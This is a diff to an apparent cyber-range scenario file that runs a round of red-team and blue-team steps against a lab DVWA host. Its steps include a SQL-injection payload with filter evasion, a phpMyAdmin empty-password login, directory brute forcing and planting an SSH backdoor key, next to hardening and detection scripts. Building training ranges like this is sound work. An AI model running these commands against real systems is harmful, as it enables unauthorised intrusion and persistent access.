@@ -30,6 +30,7 @@ steps:
     type: output_contains
     expect: Hardening applied
     field: stdout
+  target_vm: attacker
   script: sudo systemctl stop vsftpd && sudo systemctl disable vsftpd && sudo sed -i 's/PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config && sudo systemctl restart sshd && echo
     'Hardening applied'
   risk_level: low
@@ -44,6 +45,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: nmap -sV -sU --top-ports 50 10.20.40.10 && nmap -sV -p 1-10000 10.20.40.10
   risk_level: low
 - order: 3
@@ -57,6 +59,7 @@ steps:
     type: output_contains
     expect: http
     field: stdout
+  target_vm: attacker
   script: curl "http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1%27%20%2f**%2fuNiOn%2f**%2fsElEcT%201%2c2--%20&Submit=Submit" --cookie 'security=low; PHPSESSID=test'
   risk_level: medium
 - order: 4
@@ -70,6 +73,7 @@ steps:
     type: output_contains
     expect: union
     field: stdout
+  target_vm: attacker
   script: tail -50 /var/log/apache2/access.log | python3 -c "import sys,urllib.parse; [print(urllib.parse.unquote(l.strip())) for l in sys.stdin]" | grep -iE '(union|select|script)'
   risk_level: low
 - order: 5
@@ -83,6 +87,7 @@ steps:
     type: output_contains
     expect: Status
     field: stdout
+  target_vm: attacker
   script: gobuster dir -u http://10.20.40.10/ -w /usr/share/wordlists/dirb/big.txt -t 20 -o /tmp/gobuster_r2.txt 2>/dev/null || dirb http://10.20.40.10/ /usr/share/wordlists/dirb/big.txt -o /tmp/dirb_r2.txt
   risk_level: low
 - order: 6
@@ -96,6 +101,7 @@ steps:
     type: output_contains
     expect: http
     field: stdout
+  target_vm: attacker
   script: curl -s -o /dev/null -w '%{http_code}' http://10.20.40.10/phpmyadmin/ && curl -d 'pma_username=root&pma_password=&server=1' http://10.20.40.10/phpmyadmin/index.php
   risk_level: medium
 - order: 7
@@ -110,6 +116,7 @@ steps:
     type: output_contains
     expect: restricted
     field: stdout
+  target_vm: attacker
   script: "echo '<Directory /usr/share/phpmyadmin>\n  Require ip 127.0.0.1\n  Require ip ::1\n</Directory>' | sudo tee /etc/apache2/conf-available/phpmyadmin-restrict.conf && sudo a2enconf phpmyadmin-restrict\
     \ 2>/dev/null && sudo systemctl reload apache2 && echo 'phpMyAdmin restricted'"
   risk_level: low
@@ -124,6 +131,7 @@ steps:
     type: output_contains
     expect: Capture started
     field: stdout
+  target_vm: attacker
   script: sudo timeout 30 tcpdump -i eth0 -w /tmp/capture_r2.pcap host 10.20.40.10 2>/dev/null & echo 'Capture started for 30 seconds'
   risk_level: low
 - order: 9
@@ -138,6 +146,7 @@ steps:
     type: output_contains
     expect: Attack Chain
     field: stdout
+  target_vm: attacker
   script: echo '=== Attack Chain ===' && echo '1. phpMyAdmin default creds → MySQL access' && echo '2. MySQL INTO OUTFILE → webshell creation' && echo '3. Webshell → reverse shell' && echo '4. Kernel exploit
     → root' && echo 'Executing chain...'
   risk_level: medium
@@ -154,6 +163,7 @@ steps:
     type: output_contains
     expect: Auto-response script ready
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/auto_response.sh << 'SCRIPT'\n#!/bin/bash\ntail -Fn0 /var/log/suricata/fast.log | while read line; do\n  IP=$(echo $line | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | head -1)\n  if [ -n\
     \ \"$IP\" ] && [ \"$IP\" != \"10.20.40.10\" ]; then\n    sudo nft add element inet filter blocklist { $IP } 2>/dev/null\n    echo \"$(date): Auto-blocked $IP\" >> /tmp/auto_response.log\n  fi\ndone\n\
     SCRIPT\nchmod +x /tmp/auto_response.sh && echo 'Auto-response script ready'"
@@ -169,6 +179,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: ss -tunapl | grep ESTAB | grep -v '10.20.40' && echo '---' && conntrack -L 2>/dev/null | grep -c ESTABLISHED
   risk_level: low
 - order: 12
@@ -182,6 +193,7 @@ steps:
     type: output_contains
     expect: Persistent access
     field: stdout
+  target_vm: attacker
   script: mkdir -p ~/.ssh && ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '' -q && cat /tmp/backdoor_key.pub >> ~/.ssh/authorized_keys && echo 'Persistent access established'
   risk_level: medium
 - order: 13
@@ -196,6 +208,7 @@ steps:
     type: output_contains
     expect: md5
     field: stdout
+  target_vm: attacker
   script: 'bash /tmp/integrity_monitor.sh 2>/dev/null || echo ''Running manual check...'' && md5sum /etc/passwd /etc/shadow /etc/crontab /etc/ssh/sshd_config && find /home -name ''authorized_keys'' -newer
     /etc/hostname -exec echo ''ALERT: Modified {}'' \; 2>/dev/null'
   risk_level: low
@@ -211,6 +224,7 @@ steps:
     type: output_contains
     expect: Score Comparison
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Round 2 Score Comparison ==='' && echo ''Red Team: R1=85 → R2=72 (harder defense)'' && echo ''Blue Team: R1=78 → R2=90 (improved hardening)'' && echo ''Key change: Password auth disabled
     blocked brute force'''
   risk_level: low
@@ -265,6 +279,7 @@ steps:
     type: file_exists
     expect: /tmp/battle_round2_report.txt
     field: filesystem
+  target_vm: attacker
   script: 'cat > /tmp/battle_round2_report.txt << ''EOF''
 
     === Battle Round 2 Report ===
